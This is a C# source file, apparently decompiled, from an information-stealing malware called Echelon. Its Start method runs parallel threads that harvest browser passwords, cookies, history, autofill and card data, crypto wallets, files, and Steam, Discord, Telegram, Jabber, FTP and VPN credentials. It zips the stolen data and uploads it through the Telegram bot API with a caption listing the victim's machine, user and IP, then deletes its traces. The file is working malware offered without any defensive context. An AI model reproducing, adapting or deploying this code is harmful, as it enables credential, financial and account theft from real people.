using System;
using System.IO;
using System.Threading;

namespace Echelon
{
	public static class Stealer
	{
		public static void Start()
		{
			try
			{
				Directory.CreateDirectory(Global.Echelon_Dir);
				Directory.CreateDirectory(Global.Browsers);
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				al.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ad.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				TGrabber.Start(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				an.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ao.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				am.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ae.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				af.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ab.b(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ai.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				aj.a(Global.Echelon_Dir);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				q.b(Global.Browsers);
				r.a(Global.Browsers);
				o.a(Global.Browsers);
				p.a(Global.Browsers);
				s.a(Global.Browsers);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				aa.d(Global.Browsers);
				aa.c(Global.Browsers);
			}).Start();
			new Thread((ThreadStart)delegate
			{
				ak.a(Global.Echelon_Dir);
			}).Start();
			ba.a(Global.Echelon_Dir);
			GetFiles.Inizialize(Global.Echelon_Dir);
			Thread.Sleep(new Random(Environment.TickCount).Next(30000, 60000));
			string ac = Global.dir + "\\" + Global.DateLog + "_" + Global.GetHwid() + Global.CountryCOde() + ".zip";
			i.a(Global.Echelon_Dir, ac);
			string text = Global.dir + "\\" + Global.DateLog + "_" + Global.GetHwid() + Global.CountryCOde() + ".zip";
			byte[] file = File.ReadAllBytes(text);
			string url = string.Concat(Global.ApiUrl, g.d, "/sendDocument?chat_id=", g.e, "&caption=\ud83d\udc64 " + Environment.MachineName + "/" + Environment.UserName + "\n\ud83c\udff4 IP: " + Global.IP + Global.Country() + "\n\ud83c\udf10 Browsers Data" + "\n   ∟\ud83d\udd11" + (q.a + y.a + aa.a) + "\n   ∟\ud83c\udf6a" + (r.a + aa.b) + "\n   ∟\ud83d\udd51" + s.a + "\n   ∟\ud83d\udcdd" + o.a + "\n   ∟\ud83d\udcb3" + p.a + "\n\ud83d\udcb6 Wallets: " + ba.a + "\n\ud83d\udcc2 FileGrabber: " + GetFiles.count + "\n\ud83d\udd79 Steam: " + ((al.a > 0) ? "✅" : "❌") + "\n\ud83d\udcac Discord: " + ((ad.a > 0) ? "✅" : "❌") + "\n✈\ufe0f Telegram: " + ((TGrabber.count > 0) ? "✅" : "❌") + "\n\ud83d\udca1 Jabber: " + ((ai.a > 0) ? "✅" : "❌") + "\n\ud83d\udce1 FTP" + "\n   ∟ FileZilla: " + ((ae.a > 0) ? "✅" : "❌") + "\n   ∟ TotalCmd: " + ((af.a > 0) ? "✅" : "❌") + "\n\ud83d\udd0c VPN" + "\n   ∟ NordVPN: " + ((am.a > 0) ? "✅" : "❌") + "\n   ∟ OpenVPN: " + ((an.a > 0) ? "✅" : "❌") + "\n   ∟ ProtonVPN: " + ((ao.a > 0) ? "✅" : "❌") + "\n\ud83c\udd94 Global: " + Global.GetHwid() + "\n⚙\ufe0f " + ak.d());
			try
			{
				Thread.Sleep(new Random(Environment.TickCount).Next(1000, 2000));
				SenderAPI.POST(file, text, "application/x-ms-dos-executable", url);
				File.AppendAllText(g.b + "\\logs", j.a());
				Directory.Delete(Global.dir + "\\", recursive: true);
			}
			catch
			{
				Thread.Sleep(new Random(Environment.TickCount).Next(1000, 2000));
				if (!Directory.Exists(g.b))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(g.b);
					Directory.CreateDirectory(g.b);
					directoryInfo.Refresh();
					File.AppendAllText(g.b + "\\logs", j.a());
					Directory.Delete(Global.dir + "\\", recursive: true);
				}
			}
		}
	}
}
